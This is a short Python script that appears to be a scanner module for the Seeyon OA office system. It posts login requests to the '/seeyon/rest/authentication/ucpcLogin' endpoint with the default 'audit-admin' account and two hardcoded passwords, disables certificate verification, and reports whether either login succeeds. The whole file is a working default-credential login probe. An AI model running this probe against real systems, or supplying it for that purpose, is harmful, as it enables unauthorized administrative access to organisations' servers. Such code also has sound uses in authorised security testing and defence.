import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	try:
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"seeyon/rest/authentication/ucpcLogin"
		body="UserAgentFrom=iphone&login_username=audit-admin&login_password=seeyon123456"
		headers={'Content-Type': 'application/x-www-form-urlencoded'}
		response=requests.post(url,body,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and "{\"LoginOK\":\"ok\",\"loginName\":\"audit-admin\"}" in response.text:
			r1=True
		else:
			r1=False
	except:
		r1=False
	try:
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"seeyon/rest/authentication/ucpcLogin"
		body="UserAgentFrom=iphone&login_username=audit-admin&login_password=123456"
		headers={'Content-Type': 'application/x-www-form-urlencoded'}
		response=requests.post(url,body,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and "{\"LoginOK\":\"ok\",\"loginName\":\"audit-admin\"}" in response.text:
			r2=True
		else:
			r2=False
	except:
		r2=False
	if r1 or r2:
		return True
	else:
		return False
